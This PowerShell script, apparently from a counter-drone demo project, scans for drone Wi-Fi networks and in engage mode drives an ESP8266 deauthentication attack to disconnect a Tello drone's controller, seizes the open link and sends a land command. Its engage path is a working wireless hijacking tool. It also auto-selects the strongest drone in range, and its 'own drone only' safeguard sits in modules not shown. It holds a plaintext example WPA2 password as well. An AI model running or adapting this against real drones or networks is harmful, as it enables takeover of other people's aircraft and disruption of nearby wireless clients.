<#
  counter.ps1 - CounterDrone: ONE command to detect + neutralize YOUR OWN drone.

  Routes by drone type (auto-detected from the SSID):
    * TELLO-* / RMTT-*  Tello = OPEN Wi-Fi, no PMF, single-client.
                        FULL takeover works: ESP deauths the controller off ->
                        laptop seizes the open slot -> UDP "land". End to end.
    * Pluto*            WPA2 + PMF, single-client. Deauth is BLOCKED by PMF, so
                        takeover from an active pilot is impossible. It lands only
                        when the laptop already holds the link (you control it).

  Legal: only ever targets YOUR OWN drone + phone in your own demo. The Python
  land/deauth modules are allow-list gated and refuse anything else.

  USAGE (single command):
    .\counter.ps1                      # DETECT only - list drones in range
    .\counter.ps1 -Test                # DRY-RUN the whole pipeline in mock (no radio, no Wi-Fi hop)
    .\counter.ps1 -Engage              # detect + neutralize the strongest drone found
    .\counter.ps1 -Engage -Target TELLO-954B1F
    .\counter.ps1 -Engage -Target PlutoX_2025_1129 -Password plutox3154

  Run from the repo root (this folder), with the project .venv active / python on PATH.
#>
param(
  [switch]$Engage,                    # neutralize (land); default is detect-only
  [switch]$Test,                      # dry-run everything in mock - proves the pipeline, touches no radio
  [string]$Target = '',               # exact SSID to engage; else the strongest drone in range
  [string]$Password = '',             # WPA2 password (Pluto); Tello is open. '' -> read .env.local
  [string]$DeauthPort = 'COM8',       # ESP8266 serial port
  [string]$House = '',                # internet SSID to restore after; '' -> current SSID
  [int]$DeauthSeconds = 8,
  [string[]]$Patterns = @('Pluto', 'Tello', 'RMTT', 'DJI', 'Mavic', 'Anafi', 'Parrot', 'Autel')
)

$ErrorActionPreference = 'Stop'
$RepoRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$LogPath  = Join-Path $RepoRoot 'counter-log.md'

function Log([string]$m, [string]$c = 'Gray') {
  $line = ('{0}  {1}' -f (Get-Date -Format 'HH:mm:ss'), $m)
  Write-Host $line -ForegroundColor $c
  try { Add-Content -Path $LogPath -Value $line -ErrorAction SilentlyContinue } catch {}
}
function LogRaw([string]$t) {
  try { Add-Content -Path $LogPath -Value ('```' + "`n" + $t.TrimEnd() + "`n" + '```') -ErrorAction SilentlyContinue } catch {}
}
"# counter run - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n" | Out-File -FilePath $LogPath -Encoding utf8

function Get-CurrentSsid {
  $l = (netsh wlan show interfaces | Select-String '^\s*SSID\s*:' | Select-Object -First 1)
  if ($l) { return ($l.ToString() -replace '^\s*SSID\s*:\s*', '').Trim() }
  return ''
}

# --- Wi-Fi drone scan ------------------------------------------------------
function Get-Drones {
  $raw = netsh wlan show networks mode=bssid
  $nets = @(); $cur = $null
  foreach ($line in $raw) {
    if ($line -match '^\s*SSID\s+\d+\s*:\s*(.*)$') {
      if ($cur) { $nets += $cur }
      $cur = [pscustomobject]@{ SSID = $matches[1].Trim(); Signal = 0; Channel = ''; BSSID = ''; Auth = '' }
    }
    elseif ($cur -and $line -match '^\s*Authentication\s*:\s*(.*)$') { if (-not $cur.Auth) { $cur.Auth = $matches[1].Trim() } }
    elseif ($cur -and $line -match '^\s*BSSID\s+\d+\s*:\s*(.*)$')     { if (-not $cur.BSSID) { $cur.BSSID = $matches[1].Trim() } }
    elseif ($cur -and $line -match '^\s*Signal\s*:\s*(\d+)')          { if ($cur.Signal -eq 0) { $cur.Signal = [int]$matches[1] } }
    elseif ($cur -and $line -match '^\s*Channel\s*:\s*(.*)$')         { if (-not $cur.Channel) { $cur.Channel = $matches[1].Trim() } }
  }
  if ($cur) { $nets += $cur }
  $nets | Where-Object { $s = $_.SSID; ($Patterns | Where-Object { $s -match [regex]::Escape($_) }).Count -gt 0 } |
    Sort-Object Signal -Descending
}

function DroneType([string]$ssid) {
  if ($ssid -match '^(TELLO|RMTT)') { return 'tello' } else { return 'pluto' }
}

# --- WLAN profile (open for Tello, WPA2 for Pluto) -------------------------
function Ensure-Profile([string]$ssid, [string]$pass) {
  netsh wlan delete profile name="$ssid" 2>&1 | Out-Null   # drop any stale profile
  if ([string]::IsNullOrEmpty($pass)) {
    $sec = '<security><authEncryption><authentication>open</authentication><encryption>none</encryption><useOneX>false</useOneX></authEncryption></security>'
  } else {
    $sec = "<security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>$pass</keyMaterial></sharedKey></security>"
  }
  $xml = "<?xml version=""1.0""?><WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1""><name>$ssid</name><SSIDConfig><SSID><name>$ssid</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>manual</connectionMode><MSM>$sec</MSM></WLANProfile>"
  $f = Join-Path $env:TEMP ("wlan_" + ($ssid -replace '[^A-Za-z0-9]', '_') + ".xml")
  $xml | Out-File -FilePath $f -Encoding utf8
  netsh wlan add profile filename="$f" user=current | Out-Null
  Remove-Item $f -Force -ErrorAction SilentlyContinue
}

# ===========================================================================
# 1. DETECT
# ===========================================================================
Log "Scanning for drones..." 'Cyan'
$drones = @(Get-Drones)
if (-not $drones) { Log "No drone SSIDs in range." 'Green' }
foreach ($d in $drones) {
  $prox = if ($d.Signal -ge 70) { 'CLOSE' } elseif ($d.Signal -ge 40) { 'MEDIUM' } else { 'FAR' }
  Log ("  DRONE: {0,-22} {1,3}% ({2})  ch={3}  {4}  [{5}]" -f $d.SSID, $d.Signal, $prox, $d.Channel, $d.BSSID, (DroneType $d.SSID)) 'Red'
}

if (-not $Engage -and -not $Test) {
  Log "Detect-only. Add -Engage to neutralize, or -Test to dry-run." 'Cyan'
  return
}

# ===========================================================================
# 2. PICK TARGET
# ===========================================================================
$targetSsid = $Target
if (-not $targetSsid) {
  if ($Test -and -not $drones) { $targetSsid = 'TELLO-954B1F' }   # demo target for a dry run
  elseif ($drones) { $targetSsid = $drones[0].SSID }
}
if (-not $targetSsid) { Log "No target (none in range, none given)." 'Yellow'; return }
$type = DroneType $targetSsid
Log ("Target: {0}  (type: {1})" -f $targetSsid, $type) 'Cyan'

# password: Tello is open; Pluto reads .env.local if not given
if ($type -eq 'pluto' -and -not $Password) {
  $envF = Join-Path $RepoRoot '.env.local'
  if (Test-Path $envF) {
    $pw = (Get-Content $envF | Where-Object { $_ -match '^\s*Password\s*=' } | Select-Object -First 1)
    if ($pw) { $Password = ($pw -replace '^\s*Password\s*=\s*', '').Trim() }
  }
}

$mockFlag = @(); if ($Test) { $mockFlag = @('--force-mock') }

# ===========================================================================
# 3. TEST MODE - dry-run the pipeline, no Wi-Fi hop
# ===========================================================================
if ($Test) {
  Log "=== DRY RUN (mock) - no radio, no Wi-Fi change ===" 'Magenta'
  if ($type -eq 'tello') {
    Log "[plan] ESP deauth Tello controller (open net, works) -> join open $targetSsid -> UDP land" 'Magenta'
    & python -m ml.runtime.deauth_esp32 --ssid $targetSsid --authorized TELLO --attack-phone --port $DeauthPort @mockFlag 2>&1 | ForEach-Object { LogRaw $_ }
    & python -m ml.runtime.tello_control --enabled --authorized TELLO --ssid $targetSsid @mockFlag 2>&1 | ForEach-Object { LogRaw $_ }
  } else {
    Log "[plan] Pluto: deauth SKIPPED (PMF blocks it). join $targetSsid (needs you to hold the link) -> MSP land" 'Magenta'
    & python -m ml.runtime.pluto_control --enabled --authorized Pluto --ssid $targetSsid @mockFlag 2>&1 | ForEach-Object { LogRaw $_ }
  }
  Log "Dry run complete. Remove -Test to do it for real." 'Magenta'
  return
}

# ===========================================================================
# 4. ENGAGE (real) - Wi-Fi hop; internet drops until the end
# ===========================================================================
$house = $House; if (-not $house) { $house = Get-CurrentSsid }
if (-not $house -or $house -eq $targetSsid) { $house = 'NxtWave_Te@m' }
Log "Internet network to restore: $house" 'Cyan'

$deauthActive = $false
try {
  # 4a. Deauth (Tello only - it works there; Pluto PMF makes it pointless)
  if ($type -eq 'tello') {
    Log "Sustained deauth of the Tello controller (open net -> works)..." 'Yellow'
    $p = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
    $o = (& python -m ml.runtime.deauth_esp32 --ssid $targetSsid --authorized TELLO --attack-phone --port $DeauthPort 2>&1 | Out-String)
    $ErrorActionPreference = $p
    Write-Host $o.Trim(); LogRaw $o
    if ($o -match 'deauth-station') { $deauthActive = $true; Log "Controller held out." 'Green' }
    else { Log "Could not start controller deauth (no client found?) - continuing to join." 'Yellow' }
  } else {
    Log "Pluto: skipping deauth (PMF blocks it). This only lands if you already hold the link." 'Yellow'
  }

  # 4b. Join the drone
  $pass = if ($type -eq 'tello') { '' } else { $Password }
  Log "Joining $targetSsid..." 'Yellow'
  Ensure-Profile $targetSsid $pass
  netsh wlan disconnect | Out-Null; Start-Sleep -Seconds 2
  $joined = $false
  for ($i = 0; $i -lt 20; $i++) {
    if ((Get-CurrentSsid) -eq $targetSsid) { $joined = $true; break }
    $p = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
    $r = (netsh wlan connect name="$targetSsid" ssid="$targetSsid" 2>&1 | Out-String).Trim()
    $ErrorActionPreference = $p
    if ($r -and $r -notmatch 'completed successfully') { Log ("  t+{0}s connect: {1}" -f ($i*3), $r) 'DarkYellow' }
    Start-Sleep -Seconds 3
  }
  if (-not $joined) { Log "JOIN FAILED - drone slot held (single-client) or wrong password." 'Red'; throw "join failed" }
  Log "Joined $targetSsid." 'Green'

  # 4c. Wait for an IP on the drone subnet
  $gwExpect = if ($type -eq 'tello') { '192.168.10.1' } else { '192.168.4.1' }
  $haveIp = $false
  $p = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
  for ($i = 0; $i -lt 15; $i++) {
    $cfg = Get-NetIPConfiguration -InterfaceAlias 'Wi-Fi' -ErrorAction SilentlyContinue
    $ip  = ($cfg.IPv4Address | Select-Object -First 1).IPAddress
    Log ("  t+{0}s ip={1}" -f ($i*2), $ip) 'DarkGray'
    if ($ip -and ($ip -like '192.168.*')) { $haveIp = $true; break }
    Start-Sleep -Seconds 2
  }
  $ErrorActionPreference = $p
  if (-not $haveIp) { Log "No IP from the drone (slot held / single-client). Cannot land." 'Red' }

  # 4d. LAND - routed by type
  Log "Commanding LAND on $targetSsid ($type)..." 'Yellow'
  $p = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
  if ($type -eq 'tello') {
    $o = (& python -m ml.runtime.tello_control --enabled --authorized TELLO --ssid $targetSsid 2>&1 | Out-String)
  } else {
    $env:PLUTO_HOST = $gwExpect; $env:PLUTO_PORT = '23'
    $o = (& python -m ml.runtime.pluto_control --enabled --authorized Pluto --ssid $targetSsid 2>&1 | Out-String)
  }
  $ErrorActionPreference = $p
  Write-Host $o.Trim(); LogRaw $o
  if ($o -match '"sent": true' -or $o -match 'commanded land' -or $o -match 'land.*ok') {
    Log "LAND SENT - drone commanded down." 'Green'
  } else {
    Log "LAND not confirmed - see the output above." 'Red'
  }
}
finally {
  # stop the deauth so the controller isn't left knocked out
  if ($deauthActive) {
    $p = $ErrorActionPreference; $ErrorActionPreference = 'Continue'
    try { & python -m ml.runtime.deauth_esp32 --stop --port $DeauthPort 2>&1 | Out-Null } catch {}
    $ErrorActionPreference = $p
    Log "Stopped controller deauth." 'DarkGray'
  }
  Log "Restoring internet ($house)..." 'Cyan'
  netsh wlan connect name="$house" ssid="$house" 2>&1 | Out-Null
  Start-Sleep -Seconds 3
  Log ("Back online: " + (Get-CurrentSsid) + ". Log: counter-log.md") 'Green'
}
